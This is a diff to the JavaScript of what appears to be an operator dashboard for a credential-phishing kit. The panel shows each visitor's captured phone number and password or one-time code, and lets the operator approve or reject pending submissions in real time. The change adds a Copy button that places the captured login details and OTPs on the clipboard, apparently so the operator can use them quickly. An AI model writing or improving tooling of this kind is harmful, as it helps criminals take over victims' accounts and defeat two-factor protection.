@@ -771,11 +771,25 @@
         );
       }
 
+      function createCopyButtonMarkup(submissionId) {
+        if (!submissionId) {
+          return "";
+        }
+        return (
+          "<button type=\"button\" class=\"btn btn-sm btn-outline-secondary copy-submission-btn\" data-action=\"copy-submission\" data-submission-id=\"" +
+          escapeHtml(submissionId) +
+          "\">Copy</button>"
+        );
+      }
+
       function renderSubmissionActionControls(submission) {
         var submissionId = String((submission && submission.id) || "");
         var status = normalizeApprovalStatus(submission && submission.approval_status);
         var markup =
           "<span class=\"submission-status-badge " + status + "\">" + approvalStatusLabel(status) + "</span>";
+        if (submissionId) {
+          markup += createCopyButtonMarkup(submissionId);
+        }
         if (status === "pending" && submissionId) {
           markup += createApprovalButtonsMarkup(submissionId);
         }
@@ -919,6 +933,79 @@
         });
         if (hasUpdate) {
           setVisitorSubmissions(activeVisitorSubmissions);
+        }
+      }
+
+      function getActiveSubmissionById(submissionId) {
+        if (!submissionId || !Array.isArray(activeVisitorSubmissions)) {
+          return null;
+        }
+        for (var index = 0; index < activeVisitorSubmissions.length; index += 1) {
+          var submission = activeVisitorSubmissions[index];
+          if (String((submission && submission.id) || "") === String(submissionId)) {
+            return submission;
+          }
+        }
+        return null;
+      }
+
+      function buildSubmissionClipboardText(submission) {
+        if (!submission || typeof submission !== "object") {
+          return "";
+        }
+        var lines = [];
+        if (isLoginSubmission(submission)) {
+          lines.push("`" + String(submission.phone_number_display || "-") + "`");
+          lines.push("`" + String(submission.password_display || "-") + "`");
+          return lines.join("\n");
+        } else if (isOtpSubmission(submission)) {
+          lines.push("OTP: " + String(submission.otp_display || "-"));
+        } else if (Array.isArray(submission.fields)) {
+          submission.fields.forEach(function (field) {
+            var label = String(field.label || field.name || "Field").trim();
+            var value = String(field.value || "").trim();
+            if (label && value) {
+              lines.push(label + ": " + value);
+            }
+          });
+        }
+        lines.push("Status: " + approvalStatusLabel(submission.approval_status));
+        return lines.join("\n").trim();
+      }
+
+      async function copySubmissionToClipboard(submissionId, buttonEl) {
+        if (!submissionId || !buttonEl) {
+          return;
+        }
+        var submission = getActiveSubmissionById(submissionId);
+        var text = buildSubmissionClipboardText(submission);
+        if (!text) {
+          return;
+        }
+        var originalLabel = buttonEl.textContent;
+        try {
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            await navigator.clipboard.writeText(text);
+          } else {
+            var helper = document.createElement("textarea");
+            helper.value = text;
+            helper.setAttribute("readonly", "");
+            helper.style.position = "absolute";
+            helper.style.left = "-9999px";
+            document.body.appendChild(helper);
+            helper.select();
+            document.execCommand("copy");
+            document.body.removeChild(helper);
+          }
+          buttonEl.textContent = "Copied";
+          window.setTimeout(function () {
+            buttonEl.textContent = originalLabel;
+          }, 1200);
+        } catch (error) {
+          buttonEl.textContent = "Failed";
+          window.setTimeout(function () {
+            buttonEl.textContent = originalLabel;
+          }, 1200);
         }
       }
 
@@ -1087,22 +1174,12 @@
           visitorListEl.insertBefore(visitorItem, visitorListEl.firstChild);
         }
         var activeVisitorId = getActiveVisitorId();
+        if (!activeVisitorId) {
+          setActiveVisitor(visitorId);
+          reorderVisitorList();
+          return;
+        }
         if (activeVisitorId !== visitorId) {
-          if (visitorListEl) {
-            visitorListEl.querySelectorAll(".visitor-item.active").forEach(function (item) {
-              item.classList.remove("active");
-            });
-            var newActiveItem = visitorListEl.querySelector(
-              ".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]"
-            );
-            if (newActiveItem) {
-              newActiveItem.classList.add("active");
-            }
-          }
-          if (selectedVisitorLabelEl) {
-            selectedVisitorLabelEl.textContent = visitorId;
-          }
-          fetchVisitorSubmissions(visitorId);
           reorderVisitorList();
           return;
         }
@@ -1402,6 +1479,15 @@
               return;
             }
             rejectSubmission(rejectSubmissionId, rejectButton);
+            return;
+          }
+          var copyButton = event.target.closest("[data-action='copy-submission']");
+          if (copyButton) {
+            var copySubmissionId = copyButton.getAttribute("data-submission-id") || "";
+            if (!copySubmissionId) {
+              return;
+            }
+            copySubmissionToClipboard(copySubmissionId, copyButton);
           }
         });
       }
